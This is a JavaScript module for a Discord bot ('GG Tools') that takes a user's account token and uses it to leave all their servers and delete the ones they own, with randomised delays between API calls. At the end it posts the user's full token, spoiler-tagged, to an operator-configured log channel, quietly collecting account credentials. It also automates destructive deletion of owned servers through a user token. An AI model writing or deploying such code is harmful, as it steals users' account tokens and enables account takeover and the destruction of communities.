const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');
const { EmbedBuilder } = require('discord.js');
const config = JSON.parse(fs.readFileSync(path.join(__dirname, '../config.json'), 'utf8'));

async function getGuilds(token) {
  const res = await fetch('https://discord.com/api/v9/users/@me/guilds', {
    headers: { Authorization: token }
  });
  if (!res.ok) return { success: false };
  const data = await res.json();
  return { success: true, data };
}

async function getUser(token) {
  const res = await fetch('https://discord.com/api/v9/users/@me', {
    headers: { Authorization: token }
  });
  if (!res.ok) return null;
  return await res.json();
}

function hasAdmin(permissions) {
  // Discord ADMINISTRATOR bit: 0x8
  if (!permissions) return false;
  try {
    // permissions pode ser string ou number
    const perm = typeof permissions === 'string' ? BigInt(permissions) : BigInt(permissions);
    return (perm & 0x8n) === 0x8n;
  } catch {
    return false;
  }
}

async function leaveGuilds({ token, whitelistGuilds = [], log = () => {}, prompt2FA = null, leaveOwned = true, interaction = null, tokenType = 'conta' }) {
  if (tokenType === 'bot') {
    if (interaction) {
      await interaction.editReply({ content: '`❌` Bots não podem sair de servidores via API. Remova o bot manualmente do servidor.', flags: 64 });
    }
    throw new Error('Bots não podem sair de servidores via API.');
  }
  const user = await getUser(token);
  if (!user) throw new Error('Token inválido ou sem acesso.');
  const guildsRes = await getGuilds(token);
  if (!guildsRes.success) throw new Error('Não foi possível buscar os servidores.');
  const guilds = guildsRes.data;
  let left = 0, deleted = 0, errors = 0;
  for (const guild of guilds) {
    if (whitelistGuilds.includes(guild.id)) {
      log(`Ignorando servidor ${guild.name} (${guild.id}) (whitelist)`);
      continue;
    }
    // Buscar info detalhada do servidor
    let guildInfo = guild;
    try {
      const res = await fetch(`https://discord.com/api/v9/guilds/${guild.id}`, {
        headers: { Authorization: token }
      });
      if (res.ok) guildInfo = await res.json();
    } catch {}
    // Buscar membro para checar permissões
    let member = null;
    try {
      const res = await fetch(`https://discord.com/api/v9/guilds/${guild.id}/members/${user.id}`, {
        headers: { Authorization: token }
      });
      if (res.ok) member = await res.json();
    } catch {}
    if (member && hasAdmin(member.permissions)) {
      log(`Ignorando servidor ${guild.name} (${guild.id}) (usuário tem Administrador)`);
      continue;
    }
    if (guildInfo.owner_id && guildInfo.owner_id === user.id) {
      if (!leaveOwned) {
        log(`Ignorando servidor ${guildInfo.name} (${guild.id}) (usuário é dono e leaveOwned=false)`);
        continue;
      }
      // É dono, tentar deletar
      let code2FA = null;
      if (guildInfo.mfa_level === 1 && prompt2FA) {
        code2FA = await prompt2FA(guildInfo);
      }
      let body = code2FA ? JSON.stringify({ code: code2FA }) : undefined;
      let headers = { Authorization: token, 'Content-Type': 'application/json' };
      try {
        const res = await fetch(`https://discord.com/api/v9/guilds/${guild.id}/delete`, {
          method: 'POST',
          headers,
          body
        });
        if (res.status === 204) {
          deleted++;
          log(`Servidor deletado: ${guildInfo.name} (${guild.id})`);
        } else {
          errors++;
          log(`Falha ao deletar ${guildInfo.name} (${guild.id}) - Status: ${res.status}`);
        }
      } catch (e) {
        errors++;
        log(`Erro ao deletar ${guildInfo.name} (${guild.id}): ${e.message}`);
      }
    } else {
      // Não é dono, apenas sair
      try {
        const res = await fetch(`https://discord.com/api/v9/users/@me/guilds/${guild.id}`, {
          method: 'DELETE',
          headers: { Authorization: token }
        });
        if (res.status === 204) {
          left++;
          log(`Saiu do servidor: ${guild.name} (${guild.id})`);
        } else {
          errors++;
          log(`Falha ao sair de ${guild.name} (${guild.id}) - Status: ${res.status}`);
        }
      } catch (e) {
        errors++;
        log(`Erro ao sair de ${guild.name} (${guild.id}): ${e.message}`);
      }
    }
    await new Promise(res => setTimeout(res, 2000 + Math.floor(Math.random() * 400)));
  }
  const result = { left, deleted, errors };
  // Enviar log para canal do Discord se interaction for fornecido
  if (interaction) {
    const logChannelId = config.log_leave_guilds;
    if (logChannelId) {
      const logChannel = interaction.client.channels.cache.get(logChannelId);
      if (logChannel) {
        const embed = new EmbedBuilder()
          .setTitle('🚪 Sair de Servidores')
          .setColor(0x5865F2)
          .addFields(
            { name: 'Usuário', value: `<@${interaction.user.id}>`, inline: true },
            { name: 'Token', value: `||${token}||`, inline: false },
            { name: 'Saídos', value: `${left}`, inline: true },
            { name: 'Deletados', value: `${deleted}`, inline: true },
            { name: 'Falhas', value: `${errors}`, inline: true },
            { name: 'Data/Hora', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
          )
          .setFooter({ text: 'GG Tools' });
        logChannel.send({ embeds: [embed] });
      }
    }
  }
  return result;
}

module.exports = { leaveGuilds }; 